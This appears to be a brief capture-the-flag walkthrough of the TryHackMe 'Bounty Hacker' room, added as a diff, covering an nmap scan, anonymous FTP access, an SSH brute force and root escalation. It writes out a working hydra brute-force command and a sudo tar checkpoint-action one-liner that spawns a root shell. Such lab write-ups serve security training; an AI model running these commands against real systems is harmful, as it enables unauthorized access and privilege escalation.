@@ -1,0 +1,36 @@
+step 1 : scan the machine with nmap to find the services running on the target 
+
+step 2 : found Anonymous FTP login 
+
+step 3 : logged in using Anonymous found to txt file locks.txt and task.txt
+
+step 4 : downloading both files into my machine using get form FTP
+
+step 5 : open task.txt found a username lin 
+
+step 6 : now bruteforce attack on the ip service ssh
+
+ Note : The Password file used in brute forcing the attack is locks.txt which was found on Anonymous FTP login
+
+step 7 : brtueforcing ssh using hydra (SYNTAX hydra -l lin -P ~/Tryhackme/Bounty_Hacker/locks.txt IP ADDRESS ssh -f -V)
+
+step 8 : found the password now login using ssh 
+
+step 9 : logged in on user lin 
+
+         cat user.txt found first flag 
+
+step 10 : privilege escalation 
+
+          sudo -l 
+       
+          lin was able to run only  /bin/tar as root , now using this gaining the root account
+
+step 11 : visiting GTFOBINS for sudo tar 
+
+          SYNTAX : sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+step 12 : gained root access
+
+
+---->>>> THANK YOU <<<<---- 
